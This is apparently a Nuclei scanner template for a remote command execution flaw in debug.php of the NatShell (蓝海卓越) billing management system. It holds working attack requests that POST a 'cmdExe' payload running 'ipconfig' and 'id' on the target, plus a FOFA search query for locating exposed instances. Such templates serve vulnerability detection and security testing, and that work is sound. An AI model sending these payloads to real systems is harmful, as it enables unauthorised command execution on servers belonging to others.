id: natshell-debug-rce

info:
  name: 蓝海卓越计费管理系统 debug.php - rce
  author: leadlife
  severity: critical
  description: 
  reference:
    - https://github.com/wy876/POC/blob/9eefec0a4c311a412a86ab83bef3a25d3cb1766d/%E8%93%9D%E6%B5%B7%E5%8D%93%E8%B6%8A%E8%AE%A1%E8%B4%B9%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F/%E8%93%9D%E6%B5%B7%E5%8D%93%E8%B6%8A%E8%AE%A1%E8%B4%B9%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%E5%AD%98%E5%9C%A8debug.php%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E.md
  metadata:
    verified: true
    fofa-query: title=="蓝海卓越计费管理系统"
  tags: natshell,rce

http:
  - raw:
      - |
        POST /debug.php HTTP/1.1
        Host: {{Hostname}}

        cmdExe("ipconfig",body)
      
      - |
        POST /debug.php HTTP/1.1
        Host: {{Hostname}}

        cmdExe("id",body)
        
    stop-at-first-match: true
    matchers-condition: and
    matchers:
      - type: regex
        part: body
        regex:
          - "Windows IP"
          - "((u|g)id|groups)=[0-9]{1,4}\\([a-z0-9]+\\)"
        condition: or

      - type: status
        status:
          - 200